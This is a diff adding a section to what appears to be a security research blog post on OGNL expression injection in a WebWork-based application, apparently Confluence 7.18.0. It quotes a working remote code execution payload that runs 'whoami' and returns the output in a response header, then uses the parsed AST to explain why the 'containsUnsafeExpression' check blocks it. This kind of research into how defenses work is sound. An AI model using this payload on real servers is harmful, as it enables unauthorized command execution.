@@ -110,3 +110,19 @@ At a high-level overview of this function, it checks for "unsafe" expression by:
 
 ![image](https://user-images.githubusercontent.com/37280106/172555031-7416d072-ac8e-4132-81e7-1ae3ff028e8b.png)
 
+Going back to the beginning of our blog, I mentioned the payload 
+```java
+${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("whoami").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}
+```
+
+That works fine for other versions, but not 7.18.0 with this `containsUnsafeExpression` check, let's try to send that payload and see what happens:
+
+![image](https://user-images.githubusercontent.com/37280106/172557725-2c964070-c4c5-44cd-99cf-3e431adff3ed.png)
+As you can see, after our expression string is parsed into a OGNL Node, it has 3 childrens:
+```
+ASTAssign: #a = @org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("whoami").getInputStream(), "utf-8")
+ASTStaticMethod: @com.opensymphony.webwork.ServletActionContext@getResponse()
+ASTMethod: setHeader("X-Cmd-Response", #a)
+```
+Now we know why it doesn't work, because `ASTAssign` is in `UNSAFE_NODE_TYPES` so `containsUnsafeExpression` return true and we cannot get our expression evaluated 
+
